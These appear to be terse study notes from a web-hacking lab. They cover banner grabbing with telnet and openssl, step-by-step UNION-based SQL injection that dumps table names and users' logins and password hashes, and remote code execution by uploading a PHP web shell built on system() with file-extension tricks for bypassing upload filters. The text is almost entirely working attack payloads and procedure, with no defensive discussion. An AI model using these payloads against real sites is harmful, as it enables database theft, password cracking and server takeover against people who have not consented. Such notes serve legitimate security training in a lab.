a lot of information can be retrieved by connecting to the web application using netcat or telnet:

$ telnet vulnerable 80

GET / HTTP/1.1
Host: vulnerable


...X-Powered-By: PHP/5.3.3-7+squeeze3


if the application was only available via HTTPs, telnet or netcat would not be able to communicate with the server, the tool openssl can be used:

$ openssl s_client -connect vulnerable:443
$ openssl s_client -connect ptl-08e86009-6e7cbd6b.libcurl.so:443

Exploitation of SQL injections
(*) sometimes you don't even need quotes



The UNION statement is used to put together information from two requests:
SELECT * FROM articles WHERE id=3 UNION SELECT ...



Exploiting SQL injection using UNION follows the steps below:

1. Find the number of columns to perform the UNION



2. Find what columns are echoed in the page

(*) some columns may be echoed into weird places like img src

3. Retrieve information from the database meta-tables

	@@version,3,4
	current_user()
	database()

	SELECT table_name FROM information_schema.tables
	SELECT column_name FROM information_schema.columns
	SELECT table_name,column_name FROM information_schema.columns
	1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns

4. Retrieve information from other tables/databases


	1 UNION SELECT id,concat(id,':',login,':',password),password,null FROM users

(*) you can directly search for md5 hashes on google instead of going to a particular website

Remote Code Execution

1. Login to the admin account
2. Go to file upload page
3. Upload PHP with system($GET['c'])

.php is not uploading
.pHp is uploading but apparently not executing
.php3 is uploading and working
.php.test which will bypass a simple filter on .php and Apache will still use .php since in this configuration it doesn't have an handler for .test
